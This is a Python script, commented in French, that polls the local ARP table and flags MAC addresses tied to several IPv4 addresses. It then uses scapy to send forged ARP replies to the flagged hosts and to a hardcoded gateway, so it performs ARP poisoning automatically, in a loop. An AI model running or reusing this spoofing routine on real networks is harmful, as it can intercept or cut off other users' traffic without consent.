import subprocess
import re
from time import sleep
from scapy.all import ARP, send


def printArp():
    data = subprocess.check_output(["arp","-a"], shell = True, text = True)
    return data


def writeData(data):
    with open('arp.txt', 'w') as file:
        file.write(data)
        file.write("$$end$$")



def getIPstab():
    IPstab = []
    with open('arp.txt', 'r') as file:
        while("$$end$$" not in IPstab):
            IPstab.append(file.readline())
    return IPstab


def getArp(IPstab):
    DynamicTab = []
    pattern = r"(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})\s*(\w{2}-\w{2}-\w{2}-\w{2}-\w{2}-\w{2})\s*(dynamique)" # pattern qui récupère 3 groupes : l'ipv4, l'adresse MAC et le type si il est dynamique (je ne récupère pas les adresses statiques)
    for IP in IPstab :
        match = re.findall(pattern, IP)
        if match :
            DynamicTab.append(match[0])
    return DynamicTab


def poison(ipv4Target,gatewayTarget,macTarget):
    packet = ARP(op = 2, pdst = ipv4Target, psrc = gatewayTarget, hwdst = macTarget)
    packet.hwsrc = macTarget
    send(packet, verbose = False) 
    #print(packet)


def getSameIPV6(tabAddress,k):
    tabAlerte = []
    for i in range(len(tabAddress)):
        if tabAddress[i][1] == tabAddress[k][1] :
            tabAlerte.append(tabAddress[i][0])
    print("L'adresse MAC",tabAddress[k][1],"possède plusieurs adresses IPV4 :")
    for i in range(len(tabAlerte)):
        print(tabAlerte[i])
        # On réalise le arp poisoning
        gatewayTarget = "192.168.26.93" # changer cette variable selon l'IP du routeur
        macGateway = "d6:f1:31:c7:b4:6a" # changer cette variable selon l'adresse du routeur
        macTarget = tabAddress[k][1]
        macTarget = macTarget.replace("-",":")
        ipv4Target = tabAlerte[i]
        poison(ipv4Target,gatewayTarget,macTarget)
        poison(gatewayTarget,ipv4Target,macGateway)
    


def checkIP(tabAddress):
    for i in range(len(tabAddress)):
        for j in range(i, len(tabAddress)):
            if i != j and tabAddress[i][1] == tabAddress[j][1]:
                getSameIPV6(tabAddress,i)




########
# MAIN #
########

while True:
    data = printArp()
    writeData(data)
    IPstab = getIPstab()
    arpAddress = getArp(IPstab)
    print("- - - - - - - - - -")
    checkIP(arpAddress)
    sleep(2)